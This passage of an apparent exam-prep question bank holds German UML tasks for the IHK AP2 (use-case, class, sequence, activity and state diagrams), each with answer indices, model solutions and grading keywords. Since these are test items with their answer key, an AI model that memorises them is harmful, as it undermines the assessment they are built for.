    context: `Die <b>VeloNet GmbH</b> entwickelt eine App für ein Fahrradverleihsystem. Im Use-Case-Diagramm soll dargestellt werden, dass beim Anwendungsfall „Fahrrad ausleihen“ <i>immer</i> die Identität des Kunden geprüft wird.`,
    question: `Welche Beziehung zwischen „Fahrrad ausleihen“ und „Kunde identifizieren“ ist korrekt?`,
    options: [
      `«extend»-Beziehung von „Fahrrad ausleihen“ nach „Kunde identifizieren“`,
      `«include»-Beziehung von „Fahrrad ausleihen“ nach „Kunde identifizieren“`,
      `«include»-Beziehung von „Kunde identifizieren“ nach „Fahrrad ausleihen“`,
      `Generalisierung von „Kunde identifizieren“ zu „Fahrrad ausleihen“`
    ],
    correct: [1],
    solution: `«include» vom Basis-Anwendungsfall „Fahrrad ausleihen“ <b>zum</b> inkludierten Anwendungsfall „Kunde identifizieren“, da die Identifikation bei jeder Ausleihe zwingend ausgeführt wird.`,
    explanation: `«include» = obligatorisch, Pfeil zeigt auf den eingebundenen UC. «extend» = optional/bedingt, Pfeil zeigt vom erweiternden UC auf den Basis-UC. Häufiger Fehler: Pfeilrichtung beim include umdrehen.`,
    tags: ["use-case", "include"]
  },
  {
    id: "ga1-uml-002", part: "GA1", topic: "ga1-uml", type: "mc", difficulty: 2, points: 2,
    context: `Für eine Hausverwaltungssoftware werden die Klassen <code>Gebaeude</code> und <code>Wohnung</code> modelliert. Eine Wohnung existiert nur als Teil genau eines Gebäudes; wird das Gebäude aus dem System entfernt, werden auch alle Wohnungen gelöscht.`,
    question: `Welche Beziehung ist im UML-Klassendiagramm zu wählen?`,
    options: [
      `Aggregation mit hohler Raute an <code>Wohnung</code>`,
      `Komposition mit gefüllter Raute an <code>Wohnung</code>`,
      `Komposition mit gefüllter Raute an <code>Gebaeude</code>`,
      `Generalisierung mit Dreieck an <code>Gebaeude</code>`
    ],
    correct: [2],
    solution: `Komposition (existenzabhängige Teil-Ganzes-Beziehung). Die gefüllte Raute sitzt am <b>Ganzen</b>, also an <code>Gebaeude</code>. Multiplizität: Gebaeude 1 ◆—— 1..* Wohnung.`,
    explanation: `Die Raute gehört immer an die Seite des Ganzen. Aggregation wäre richtig, wenn die Teile unabhängig weiterexistieren könnten (z.&nbsp;B. Mitarbeiter in Projektteam). Generalisierung ist eine „ist-ein“-Beziehung – eine Wohnung ist kein Gebäude.`,
    tags: ["klassendiagramm", "komposition"]
  },
  {
    id: "ga1-uml-003", part: "GA1", topic: "ga1-uml", type: "mc", difficulty: 2, points: 2,
    context: `Anforderung aus dem Lastenheft eines Schulverwaltungssystems: „Jeder Schüler ist genau einer Klasse zugeordnet. Eine Klasse besteht aus mindestens 10 und höchstens 32 Schülern.“`,
    question: `Welche Multiplizitäten sind an der Assoziation <code>Klasse —— Schueler</code> korrekt eingetragen (jeweils Wert am Ende der Klasse / Wert am Ende des Schülers)?`,
    options: [
      `Klasse: <code>10..32</code> / Schueler: <code>1</code>`,
      `Klasse: <code>1</code> / Schueler: <code>10..32</code>`,
      `Klasse: <code>0..1</code> / Schueler: <code>*</code>`,
      `Klasse: <code>1..*</code> / Schueler: <code>10..32</code>`
    ],
    correct: [1],
    solution: `Am Ende <code>Klasse</code> steht <b>1</b> (ein Schüler gehört zu genau einer Klasse), am Ende <code>Schueler</code> steht <b>10..32</b> (eine Klasse hat 10 bis 32 Schüler).<br><code>Klasse "1" —— "10..32" Schueler</code>`,
    explanation: `Lesart: Man liest von einer Klasse aus über die Linie zum gegenüberliegenden Ende – die Zahl dort gibt an, wie viele Objekte der gegenüberliegenden Klasse mit EINEM Objekt verbunden sind. Typischer Fehler: Werte vertauschen (Antwort A).`,
    tags: ["klassendiagramm", "multiplizitaet"]
  },
  {
    id: "ga1-uml-004", part: "GA1", topic: "ga1-uml", type: "mc", difficulty: 1, points: 2,
    question: `In einem Sequenzdiagramm soll abgebildet werden: „<i>Wenn</i> der Artikel auf Lager ist, wird er reserviert, <i>sonst</i> wird eine Nachbestellung ausgelöst.“ Welches kombinierte Fragment verwenden Sie?`,
    options: [`opt`, `loop`, `alt`, `par`],
    correct: [2],
    solution: `<b>alt</b> (Alternative) mit zwei Operanden, getrennt durch eine gestrichelte Linie: <code>[lagerbestand &gt; 0]</code> → reservieren(), <code>[else]</code> → nachbestellen().`,
    explanation: `opt entspricht einem if ohne else (nur ein Operand), loop einer Schleife, par parallelen Abläufen.`,
    tags: ["sequenzdiagramm", "fragment"]
  },
  {
    id: "ga1-uml-005", part: "GA1", topic: "ga1-uml", type: "multi", difficulty: 2, points: 4,
    question: `Welche Aussagen zum Use-Case-Diagramm sind korrekt? (Mehrfachauswahl)`,
    options: [
      `Akteure befinden sich außerhalb der Systemgrenze.`,
      `Ein Akteur kann auch ein externes System sein, z.&nbsp;B. ein Zahlungsdienstleister.`,
      `Use-Case-Diagramme beschreiben die zeitliche Reihenfolge von Methodenaufrufen.`,
      `Bei «extend» wird der erweiternde Anwendungsfall nur unter einer bestimmten Bedingung ausgeführt.`,
      `Zwischen Akteuren ist eine Generalisierung möglich.`,
      `Ein Akteur sollte mit dem konkreten Namen einer Person bezeichnet werden, z.&nbsp;B. „Frau Schulz“.`
    ],
    correct: [0, 1, 3, 4],
    solution: `Richtig: Akteure außerhalb der Systemgrenze; Akteure können Fremdsysteme sein; «extend» ist bedingt/optional; Generalisierung zwischen Akteuren (z.&nbsp;B. Administrator erbt von Benutzer) ist erlaubt.<br>Falsch: zeitliche Reihenfolge von Methodenaufrufen zeigt das <b>Sequenzdiagramm</b>; Akteure sind <b>Rollen</b>, keine konkreten Personen.`,
    explanation: `Use-Case-Diagramme zeigen das „Was“ (Funktionalität aus Nutzersicht), nicht das „Wie“ oder „Wann“.`,
    tags: ["use-case"]
  },
  {
    id: "ga1-uml-006", part: "GA1", topic: "ga1-uml", type: "multi", difficulty: 3, points: 4,
    context: `Ein Kollege hat folgendes Klassendiagramm in Textnotation entworfen:
<pre>class Konto {
  - kontonummer : String
  - saldo : double
  + einzahlen(betrag : double) : void
  + abheben(betrag : double) : boolean
}
class Girokonto
class Sparkonto
Konto &lt;|-- Girokonto
Konto &lt;|-- Sparkonto
Kunde "1..*" -- "1" Konto        ' Kommentar: "Ein Kunde kann mehrere Konten haben,
                                 '  jedes Konto gehört genau einem Kunden"
Konto o-- "0..*" Buchung        ' Buchungen werden mit dem Konto gelöscht
Girokonto : + dispo : double     ' soll nur in Girokonto und Unterklassen sichtbar sein</pre>`,
    question: `Welche Fehler bzw. Unstimmigkeiten enthält der Entwurf? (Mehrfachauswahl)`,
    options: [
      `Die Multiplizitäten zwischen Kunde und Konto sind vertauscht.`,
      `Zwischen Konto und Buchung müsste laut Kommentar eine Komposition (*--) statt einer Aggregation stehen.`,
      `Das Attribut <code>dispo</code> müsste laut Kommentar die Sichtbarkeit <code>#</code> statt <code>+</code> haben.`,
      `Die Vererbungspfeile zeigen in die falsche Richtung; das Dreieck müsste an Girokonto/Sparkonto stehen.`,
      `Geldbeträge sollten fachlich eher als Dezimaltyp (z.&nbsp;B. BigDecimal/decimal) statt <code>double</code> modelliert werden.`
    ],
    correct: [0, 1, 2, 4],
    solution: `<ul><li><b>Multiplizitäten vertauscht</b>: richtig wäre <code>Kunde "1" -- "1..*" Konto</code> (bzw. 0..*), da ein Kunde mehrere Konten hat.</li>
<li><b>Komposition</b> statt Aggregation, weil Buchungen existenzabhängig sind: <code>Konto *-- "0..*" Buchung</code>.</li>
<li><b>Sichtbarkeit</b> <code># dispo : double</code> (protected).</li>
<li><b>double</b> ist für Geldbeträge wegen Rundungsfehlern ungeeignet → BigDecimal/decimal.</li></ul>
Die Vererbungsnotation <code>Konto &lt;|-- Girokonto</code> ist korrekt: das Dreieck zeigt zur Oberklasse Konto.`,
    explanation: `Fehlersuche-Aufgaben kommen in der AP2 häufig. Systematisch prüfen: Pfeilrichtungen, Rauten, Multiplizitäten, Sichtbarkeiten, Datentypen, abstrakte Klassen (hier könnte Konto auch abstrakt sein – kein Fehler, aber Verbesserungsvorschlag).`,
    tags: ["klassendiagramm", "fehlersuche"]
  },
  {
    id: "ga1-uml-007", part: "GA1", topic: "ga1-uml", type: "multi", difficulty: 1, points: 3,
    question: `Welche der folgenden UML-Diagramme gehören zu den <b>Verhaltensdiagrammen</b>?`,
    options: [`Aktivitätsdiagramm`, `Klassendiagramm`, `Zustandsdiagramm`, `Verteilungsdiagramm`, `Sequenzdiagramm`, `Komponentendiagramm`, `Use-Case-Diagramm`],
    correct: [0, 2, 4, 6],
    solution: `Verhaltensdiagramme: Aktivitäts-, Zustands-, Sequenz- (Interaktionsdiagramm) und Use-Case-Diagramm.<br>Strukturdiagramme: Klassen-, Verteilungs-, Komponentendiagramm (ferner Objekt-, Paket-, Kompositionsstrukturdiagramm).`,
    explanation: `Strukturdiagramme zeigen den statischen Aufbau, Verhaltensdiagramme dynamische Abläufe bzw. Funktionalität. Das Use-Case-Diagramm wird in UML 2 zu den Verhaltensdiagrammen gezählt.`,
    tags: ["uml-grundlagen"]
  },
  {
    id: "ga1-uml-008", part: "GA1", topic: "ga1-uml", type: "text", difficulty: 2, points: 8,
    context: `Die <b>Praxis Dr. Lindner</b> lässt von Ihrem Unternehmen ein Online-Terminbuchungssystem entwickeln. Aus dem Interview:<br>
„<i>Patienten sollen online Termine buchen und stornieren können. Dafür müssen sie sich immer anmelden. Bei der Buchung kann der Patient optional eine Erinnerungs-SMS anfordern. Medizinische Fachangestellte (MFA) pflegen die Sprechzeiten und können ebenfalls Termine buchen und stornieren. Die Ärztin hat alle Rechte einer MFA und kann zusätzlich Urlaubssperren eintragen. Die SMS werden über einen externen SMS-Gateway-Dienst versendet.</i>“`,
    question: `Erstellen Sie ein Use-Case-Diagramm in textueller Form. Nennen Sie Systemgrenze, Akteure, Anwendungsfälle sowie alle Beziehungen (Assoziation, «include», «extend», Generalisierung) mit Richtung.`,
    solution: `<pre>Systemgrenze: "Online-Terminbuchung Praxis Dr. Lindner"

Akteure (außerhalb):  Patient, MFA, Ärztin, SMS-Gateway (Fremdsystem)

Use Cases (innerhalb):
  (Termin buchen) (Termin stornieren) (Anmelden)
  (Erinnerungs-SMS anfordern) (Sprechzeiten pflegen) (Urlaubssperre eintragen)

Assoziationen:
  Patient  --- (Termin buchen), (Termin stornieren)
  MFA      --- (Termin buchen), (Termin stornieren), (Sprechzeiten pflegen)
  Ärztin   --- (Urlaubssperre eintragen)
  SMS-Gateway --- (Erinnerungs-SMS anfordern)

Generalisierung:
  Ärztin ----|&gt; MFA          (Ärztin erbt alle Anwendungsfälle der MFA)

«include»:
  (Termin buchen)     ..«include»..&gt; (Anmelden)
  (Termin stornieren) ..«include»..&gt; (Anmelden)

«extend»:
  (Erinnerungs-SMS anfordern) ..«extend»..&gt; (Termin buchen)
       Extension Point: "Erinnerung gewünscht"</pre>`,
    explanation: `Bewertet werden: richtige Akteure als Rollen (inkl. Fremdsystem SMS-Gateway), Systemgrenze, include für „immer anmelden“, extend für „optional SMS“, Generalisierung Ärztin → MFA (Pfeil zur allgemeineren Rolle). Häufige Fehler: „Anmelden“ als eigener Akteur-UC ohne include, extend-Pfeil in falsche Richtung, SMS-Gateway innerhalb der Systemgrenze.`,
    keywords: ["systemgrenze", "patient", "mfa", "ärztin|aerztin", "sms-gateway|gateway", "include", "extend", "generalisierung|erbt", "anmelden", "termin buchen"],
    tags: ["use-case", "erstellen"]
  },
  {
    id: "ga1-uml-009", part: "GA1", topic: "ga1-uml", type: "text", difficulty: 2, points: 4,
    question: `Erläutern Sie den Unterschied zwischen einer <b>Aggregation</b> und einer <b>Komposition</b> im UML-Klassendiagramm. Geben Sie jeweils ein Beispiel an und beschreiben Sie die Notation.`,
    solution: `<ul>
<li><b>Aggregation</b> („hat-ein“, schwache Teil-Ganzes-Beziehung): Die Teile können unabhängig vom Ganzen existieren und ggf. mehreren Ganzen zugeordnet sein. Notation: <b>hohle (weiße) Raute</b> am Ganzen. Beispiel: <code>Mannschaft ◇—— Spieler</code> – wird die Mannschaft aufgelöst, existieren die Spieler weiter.</li>
<li><b>Komposition</b> („besteht-aus“, starke Teil-Ganzes-Beziehung): Die Teile sind <b>existenzabhängig</b> vom Ganzen; ein Teil gehört zu genau einem Ganzen; wird das Ganze gelöscht, werden die Teile mitgelöscht. Notation: <b>gefüllte (schwarze) Raute</b> am Ganzen, Multiplizität am Ganzen immer 1 (bzw. 0..1). Beispiel: <code>Bestellung ◆—— Bestellposition</code>.</li>
</ul>`,
    explanation: `Prüfer erwarten: Existenzabhängigkeit als Kernunterschied, korrekte Raute (hohl/gefüllt), Position am Ganzen, je ein passendes Beispiel.`,
    keywords: ["existenzabhängig|existenzabhaengig|lebensdauer", "raute", "hohl|weiß|leer", "gefüllt|schwarz|ausgefüllt", "ganze|ganzen", "teil", "gelöscht|löschen|zerstört"],
    tags: ["klassendiagramm"]
  },
  {
    id: "ga1-uml-010", part: "GA1", topic: "ga1-uml", type: "text", difficulty: 3, points: 8,
    context: `In einem Webshop wird der Ablauf „Bestellung abschließen“ wie folgt implementiert:<br>
Der <i>Kunde</i> klickt in der <code>:ShopUI</code> auf „Kaufen“. Die UI ruft synchron <code>bestellen(warenkorb)</code> am <code>:BestellController</code> auf. Dieser ruft für <b>jede Position</b> des Warenkorbs <code>pruefeBestand(artNr, menge)</code> am <code>:Lager</code> auf, das jeweils <code>true/false</code> zurückgibt. Sind alle Positionen verfügbar, erzeugt der Controller ein neues Objekt <code>:Bestellung</code>, ruft <code>zahlungAusfuehren(betrag)</code> am <code>:PaymentService</code> auf und versendet anschließend <b>asynchron</b> <code>sendeBestaetigung(bestellung)</code> an den <code>:MailService</code>. Andernfalls wird eine Fehlermeldung an die UI zurückgegeben.`,
    question: `Beschreiben Sie das zugehörige Sequenzdiagramm textuell: Nennen Sie Lebenslinien, alle Nachrichten in zeitlicher Reihenfolge mit Nachrichtenart (synchron, asynchron, Antwort, Erzeugung) und die benötigten kombinierten Fragmente.`,
    solution: `<b>Lebenslinien</b> (von links nach rechts): Kunde (Akteur), :ShopUI, :BestellController, :Lager, :Bestellung (wird erst erzeugt), :PaymentService, :MailService.
<pre>1  Kunde -&gt; ShopUI               : kaufenKlicken()                (synchron)
2  ShopUI -&gt; BestellController   : bestellen(warenkorb)           (synchron, gefüllte Spitze)
   loop [für jede Position im Warenkorb]
3     BestellController -&gt; Lager : pruefeBestand(artNr, menge)    (synchron)
4     Lager --&gt; BestellController: true / false                   (Antwort, gestrichelt)
   end
   alt [alle Positionen verfügbar]
5     BestellController --&gt; Bestellung : «create» new Bestellung() (Erzeugung, gestrichelt,
                                         Lebenslinie beginnt erst hier)
6     BestellController -&gt; PaymentService : zahlungAusfuehren(betrag) (synchron)
7     PaymentService --&gt; BestellController: ok                        (Antwort)
8     BestellController -&gt;&gt; MailService   : sendeBestaetigung(bestellung)
                                         (asynchron, offene Pfeilspitze, keine Antwort abwarten)
9     BestellController --&gt; ShopUI : Bestellbestätigung               (Antwort)
   else [nicht alle verfügbar]
10    BestellController --&gt; ShopUI : Fehlermeldung                    (Antwort)
   end
11 ShopUI --&gt; Kunde : Anzeige Ergebnis</pre>`,
    explanation: `Wichtig für die Punkte: loop-Fragment für die Bestandsprüfung, alt-Fragment mit zwei Operanden und Guards, Erzeugungsnachricht für :Bestellung (Objekt steht tiefer), asynchrone Nachricht an MailService mit offener Pfeilspitze, gestrichelte Antworten. Typischer Fehler: opt statt alt verwenden, obwohl ein else-Zweig existiert.`,
    keywords: ["lebenslinie", "loop", "alt", "synchron", "asynchron", "create|erzeugung|erzeugt", "antwort|rückgabe|rueckgabe", "pruefeBestand", "zahlungAusfuehren", "sendeBestaetigung"],
    tags: ["sequenzdiagramm"]
  },
  {
    id: "ga1-uml-011", part: "GA1", topic: "ga1-uml", type: "text", difficulty: 3, points: 8,
    context: `Der Versandhändler <b>Nordpaket KG</b> beschreibt den Ablauf einer Retoure:<br>
„<i>Der Kunde meldet die Retoure im Kundenportal an. Das System prüft, ob die Rückgabefrist (30 Tage) eingehalten ist. Ist sie überschritten, wird die Retoure abgelehnt und der Ablauf endet. Andernfalls erstellt das System ein Retourenlabel. Nach Wareneingang prüft das Lager die Ware. Danach geschehen parallel zwei Dinge: Die Buchhaltung erstattet den Kaufpreis und das Lager bucht die Ware wieder ein. Erst wenn beides erledigt ist, erhält der Kunde eine Abschlussmail.</i>“`,
    question: `Beschreiben Sie das zugehörige UML-Aktivitätsdiagramm mit Aktivitätsbereichen (Swimlanes) textuell. Verwenden Sie die korrekten Bezeichnungen der Knoten (Start, Ende, Aktion, Verzweigung, Gabelung, Vereinigung).`,
    solution: `<b>Swimlanes</b>: Kunde | System (Kundenportal) | Lager | Buchhaltung
<pre>[Kunde]       ● Startknoten
[Kunde]       (Retoure anmelden)
[System]      (Rückgabefrist prüfen)
[System]      ◇ Verzweigung
                 [Frist überschritten] → (Retoure ablehnen) → ◉ Endknoten
                 [Frist eingehalten]   → (Retourenlabel erstellen)
[Kunde]       (Ware zurücksenden)          (optional als Aktion)
[Lager]       (Ware prüfen)
              ━━━ Gabelung (Fork, dicker Balken) ━━━
[Buchhaltung]   (Kaufpreis erstatten)       ‖ parallel
[Lager]         (Ware einbuchen)            ‖
              ━━━ Vereinigung (Join) – wartet auf beide Flüsse ━━━
[System]      (Abschlussmail senden)
              ◉ Endknoten</pre>`,
    explanation: `Bewertung: Startknoten, Verzweigung mit sich ausschließenden Guards [überschritten]/[eingehalten], zwei Endknoten oder Zusammenführung vor einem Endknoten, Fork/Join als Synchronisationsbalken (nicht als Raute!), Zuordnung der Aktionen zu Swimlanes. Typischer Fehler: Parallelität mit einer Raute modellieren – die Raute bedeutet „entweder/oder“, der Balken „sowohl als auch“.`,
    keywords: ["startknoten|start", "endknoten|ende", "verzweigung|entscheidung|raute", "guard|bedingung|[", "gabelung|fork|parallel", "vereinigung|join|synchronisation", "swimlane|aktivitätsbereich|partition", "lager", "buchhaltung"],
    tags: ["aktivitaetsdiagramm"]
  },
  {
    id: "ga1-uml-012", part: "GA1", topic: "ga1-uml", type: "text", difficulty: 2, points: 6,
    context: `Ein Ticketsystem für den IT-Support verwaltet Störungsmeldungen. Ein Ticket wird beim Anlegen „Neu“. Sobald ein Techniker es übernimmt, ist es „In Bearbeitung“. Benötigt der Techniker Infos vom Anwender, wechselt es nach „Wartet auf Rückmeldung“; trifft die Antwort ein, geht es zurück in Bearbeitung. Nach der Lösung wird es „Gelöst“. Bestätigt der Anwender die Lösung oder vergehen 7 Tage ohne Reaktion, wird es „Geschlossen“ (Endzustand). Lehnt der Anwender die Lösung ab, geht das Ticket zurück in „In Bearbeitung“.`,
    question: `Erstellen Sie das Zustandsdiagramm für die Klasse <code>Ticket</code> in textueller Notation (Zustände, Transitionen mit <code>ereignis [guard] / aktion</code>, Start- und Endzustand).`,
    solution: `<pre>[*] --&gt; Neu                       : anlegen() / ticketNrVergeben()
Neu --&gt; InBearbeitung              : uebernehmen(techniker)
InBearbeitung --&gt; WartetAufRueckmeldung : rueckfrageStellen() / mailAnAnwender()
WartetAufRueckmeldung --&gt; InBearbeitung : antwortEingegangen()
InBearbeitung --&gt; Geloest          : loesungEintragen()
Geloest --&gt; Geschlossen            : bestaetigen()
Geloest --&gt; Geschlossen            : after(7 Tage) [keine Reaktion]
Geloest --&gt; InBearbeitung          : ablehnen() / wiederOeffnen()
Geschlossen --&gt; [*]</pre>
Optional: Zustand „Neu“ mit <code>entry / benachrichtigeTeam()</code>.`,
    explanation: `Wichtig: genau ein Startzustand, Endzustand nach „Geschlossen“, zeitgesteuerte Transition (after/when) für die 7 Tage, Rücktransitionen (Wartet → In Bearbeitung, Gelöst → In Bearbeitung). Typischer Fehler: Aktivitäten (Tätigkeiten) als Zustände modellieren oder Ereignisse vergessen.`,
    keywords: ["neu", "in bearbeitung|inbearbeitung", "wartet", "gelöst|geloest", "geschlossen", "startzustand|[*]|start", "endzustand|ende", "7 tage|after", "ablehnen"],
    tags: ["zustandsdiagramm"]
  },
  {
    id: "ga1-uml-013", part: "GA1", topic: "ga1-uml", type: "text", difficulty: 3, points: 6,
    context: `Ein Auszubildender hat folgendes Aktivitätsdiagramm für „Login“ beschrieben:
<pre>● Start
(Benutzername und Passwort eingeben)
◇ Entscheidung
   [Passwort korrekt]      → (Startseite anzeigen) → ◉ Ende
   [Fehlversuche &gt;= 3]     → (Konto sperren)       → ◉ Ende
━━━ Gabelung ━━━
   (Fehlversuch zählen)
   (Fehlermeldung anzeigen)
◇ Zusammenführung → zurück zu (Benutzername und Passwort eingeben)</pre>`,
    question: `Nennen Sie drei fachliche bzw. notationelle Fehler in diesem Diagramm und geben Sie jeweils eine Korrektur an.`,
    solution: `<ol>
<li><b>Guards nicht disjunkt und unvollständig</b>: „Passwort korrekt“ und „Fehlversuche &gt;= 3“ schließen sich nicht aus; der Fall „Passwort falsch und &lt; 3 Fehlversuche“ fehlt als Ausgang der Raute. Korrektur: [Passwort korrekt] / [Passwort falsch] und danach eine zweite Entscheidung [Fehlversuche &gt;= 3] / [else].</li>
<li><b>Gabelung ohne Eingang/falsch eingesetzt</b>: Die Gabelung hängt nicht an einem Fluss der Entscheidung; zudem ist der Fehlversuchszähler vor der Prüfung auf 3 zu erhöhen. Korrektur: Fluss [Passwort falsch] → (Fehlversuch zählen) → Entscheidung [&gt;= 3] → (Konto sperren); [&lt; 3] → (Fehlermeldung anzeigen).</li>
<li><b>Gabelung ohne Vereinigung (Join)</b>: Parallele Flüsse werden mit einer Raute (Zusammenführung) statt mit einem Synchronisationsbalken zusammengeführt. Korrektur: Join-Balken verwenden oder – fachlich sinnvoller – die Aktionen sequenziell anordnen (keine echte Parallelität nötig).</li>
<li>Bei „Konto sperren“ fehlt ein Hinweis an den Benutzer (Aktion „Sperrhinweis anzeigen“); fachlich zudem kein Ende ohne Rückmeldung.</li>
</ol>`,
    explanation: `Bei Aktivitätsdiagrammen immer prüfen: Vollständigkeit und Disjunktheit der Guards, jeder Fork braucht einen Join, Raute = Entscheidung/Zusammenführung, Balken = Parallelität, jeder Pfad endet in einem Endknoten.`,
    keywords: ["guard|bedingung", "disjunkt|ausschließen|überschneiden", "unvollständig|fehlt|else", "gabelung|fork", "vereinigung|join|synchronisation", "raute|zusammenführung", "fehlversuch"],
    tags: ["aktivitaetsdiagramm", "fehlersuche"]
  },
  {
    id: "ga1-uml-014", part: "GA1", topic: "ga1-uml", type: "code", difficulty: 3, points: 12, lang: "pseudocode",
    context: `Die <b>VeloNet GmbH</b> plant die Software für ihren Fahrradverleih. Auszug aus dem Fachkonzept:<br>
<ul><li>Ein <b>Kunde</b> hat Kundennummer, Name und E-Mail. Er kann beliebig viele <b>Ausleihen</b> tätigen.</li>
<li>Jede Ausleihe hat Start- und Endzeitpunkt und betrifft genau ein <b>Fahrrad</b>. Ein Fahrrad kann im Laufe der Zeit beliebig oft ausgeliehen werden. Die Ausleihe kann ihren Preis berechnen.</li>
<li>Ein Fahrrad hat eine Rahmennummer und einen Status. Es gibt <b>E-Bikes</b> (zusätzlich Akkustand in %) und <b>Citybikes</b> (zusätzlich Anzahl Gänge). Ein allgemeines Fahrrad wird nie instanziiert.</li>
<li>Jedes Fahrrad ist genau einer <b>Station</b> zugeordnet (Name, Adresse); eine Station hat 0 bis 20 Fahrräder. Fahrräder werden bei der Schließung einer Station nicht gelöscht, sondern umverteilt.</li>
<li>Die Preisberechnung soll über eine Schnittstelle <b>Tarif</b> mit der Methode <code>berechnePreis(minuten : int) : decimal</code> erfolgen, die von <b>Minutentarif</b> und <b>Tagestarif</b> implementiert wird. Jede Ausleihe verwendet genau einen Tarif.</li>
<li>Attribute sind privat; die Gesamtzahl aller Ausleihen soll klassenweit gezählt werden.</li></ul>`,
    question: `Erstellen Sie das Klassendiagramm in einer PlantUML-ähnlichen Textnotation mit Attributen (Sichtbarkeit, Typ), wichtigen Methoden, Beziehungsarten und Multiplizitäten.`,
    starter: `class Kunde {\n  ...\n}\n`,
    solution: `<pre>class Kunde {
  - kundenNr : int
  - name : String
  - email : String
  + ausleihen(rad : Fahrrad, tarif : Tarif) : Ausleihe
}

class Ausleihe {
  - start : DateTime
  - ende : DateTime
  - <u>anzahlAusleihen : int</u>        {static}
  + berechnePreis() : decimal
}

abstract class Fahrrad {           ' kursiv bzw. {abstract}
  - rahmenNr : String
  - status : String
}
class EBike {
  - akkustand : int
}
class Citybike {
  - anzahlGaenge : int
}

class Station {
  - name : String
  - adresse : String
}

interface Tarif {                  ' «interface»
  + berechnePreis(minuten : int) : decimal
}
class Minutentarif
class Tagestarif

Kunde    "1"    --  "0..*" Ausleihe
Ausleihe "0..*" --&gt; "1"    Fahrrad
Ausleihe "0..*" --&gt; "1"    Tarif
Station  "1"    o-- "0..20" Fahrrad     ' Aggregation
Fahrrad  &lt;|-- EBike                     ' Vererbung
Fahrrad  &lt;|-- Citybike
Tarif    &lt;|.. Minutentarif              ' Realisierung (gestrichelt)
Tarif    &lt;|.. Tagestarif</pre>`,
    explanation: `Punkte gibt es für: abstrakte Klasse Fahrrad, zwei Unterklassen mit Vererbung, Interface Tarif mit Realisierung (gestrichelt!), statisches Attribut (unterstrichen) für die Gesamtzahl, Aggregation (nicht Komposition, da Fahrräder weiterbestehen) mit 0..20, korrekte Multiplizitäten 1 / 0..* an Kunde–Ausleihe und Ausleihe–Fahrrad, private Attribute. Typische Fehler: Komposition bei Station; Tarif als Oberklasse mit Vererbung statt Interface; Multiplizitäten vertauscht; Geld als double.`,
    keywords: ["abstract|abstrakt", "interface|«interface»", "&lt;|--|<|--|vererbung", "&lt;|..|<|..|realisierung|..|>", "o--|aggregation", "0..20", "0..*", "static|statisch|unterstrichen", "berechnePreis", "private|-"],
    tags: ["klassendiagramm", "erstellen"]
  },
  {
    id: "ga1-uml-015", part: "GA1", topic: "ga1-uml", type: "code", difficulty: 2, points: 8, lang: "pseudocode",
    context: `Gegeben ist folgender Java-Quelltext:
<pre><code>public abstract class Mitarbeiter {
    private static int anzahl = 0;
    protected String name;
    private double grundgehalt;

    public Mitarbeiter(String name, double grundgehalt) { ... }
    public abstract double berechneGehalt();
    public static int getAnzahl() { return anzahl; }
}

public class Entwickler extends Mitarbeiter implements Zertifizierbar {
    private List&lt;Projekt&gt; projekte = new ArrayList&lt;&gt;();
    public double berechneGehalt() { ... }
    public void zertifizieren(String kurs) { ... }
}

public interface Zertifizierbar {
    void zertifizieren(String kurs);
}

public class Projekt {
    String bezeichnung;
}</code></pre>`,
    question: `Leiten Sie aus dem Quelltext das UML-Klassendiagramm in Textnotation ab. Achten Sie auf Sichtbarkeiten, statische und abstrakte Elemente sowie Beziehungen inkl. Multiplizität.`,
    solution: `<pre>abstract class Mitarbeiter {        ' Name kursiv
  - <u>anzahl : int = 0</u>               ' statisch → unterstrichen
  # name : String
  - grundgehalt : double
  + Mitarbeiter(name : String, grundgehalt : double)
  + {abstract} berechneGehalt() : double   ' kursiv
  + <u>getAnzahl() : int</u>
}

class Entwickler {
  - projekte : List&lt;Projekt&gt;          ' optional, da als Assoziation dargestellt
  + berechneGehalt() : double
  + zertifizieren(kurs : String) : void
}

interface Zertifizierbar {           ' «interface»
  + zertifizieren(kurs : String) : void
}

class Projekt {
  ~ bezeichnung : String              ' package-private (keine Angabe in Java)
}

Mitarbeiter    &lt;|-- Entwickler          ' Vererbung (extends)
Zertifizierbar &lt;|.. Entwickler          ' Realisierung (implements)
Entwickler "*" --&gt; "0..*" Projekt       ' gerichtete Assoziation (Liste)</pre>`,
    explanation: `Häufige Fehler: Package-Sichtbarkeit (<code>~</code>) übersehen; static nicht unterstreichen; Realisierung als durchgezogene Linie zeichnen; Multiplizität der Liste als 1 statt 0..* angeben. Die Multiplizität am Entwickler-Ende ist aus dem Code nicht eindeutig ableitbar (* ist eine sinnvolle Annahme).`,
    keywords: ["abstract|abstrakt", "unterstrichen|static|statisch", "#", "~|package", "&lt;|--|<|--|vererbung", "&lt;|..|<|..|realisierung", "0..*|*", "interface|«interface»"],
    tags: ["klassendiagramm", "code"]
  },
  {
    id: "ga1-uml-016", part: "GA1", topic: "ga1-uml", type: "code", difficulty: 2, points: 8, lang: "java",
    context: `Klassendiagramm (Textnotation):
<pre>class Bestellung {
  - bestellNr : int
  - datum : LocalDate
  + addPosition(p : Position) : void
  + getGesamtbetrag() : BigDecimal
}
class Position {
  - menge : int
  - einzelpreis : BigDecimal
  + getSumme() : BigDecimal
}
Bestellung "1" *-- "1..*" Position</pre>`,
    question: `Setzen Sie das Klassendiagramm in Java (oder einer anderen objektorientierten Sprache) um. Implementieren Sie auch die Methoden <code>addPosition</code>, <code>getSumme</code> und <code>getGesamtbetrag</code>.`,
    solution: `<pre><code>import java.math.BigDecimal;
import java.time.LocalDate;
import java.util.ArrayList;
import java.util.List;

public class Bestellung {
    private int bestellNr;
    private LocalDate datum;
    private final List&lt;Position&gt; positionen = new ArrayList&lt;&gt;();  // Komposition

    public Bestellung(int bestellNr, LocalDate datum) {
        this.bestellNr = bestellNr;
        this.datum = datum;
    }

    public void addPosition(Position p) {
        positionen.add(p);
    }

    public BigDecimal getGesamtbetrag() {
        BigDecimal summe = BigDecimal.ZERO;
        for (Position p : positionen) {
            summe = summe.add(p.getSumme());
        }
        return summe;
    }
}

public class Position {
    private int menge;
    private BigDecimal einzelpreis;

    public Position(int menge, BigDecimal einzelpreis) {
        this.menge = menge;
        this.einzelpreis = einzelpreis;
    }

    public BigDecimal getSumme() {
        return einzelpreis.multiply(BigDecimal.valueOf(menge));
    }
}</code></pre>`,
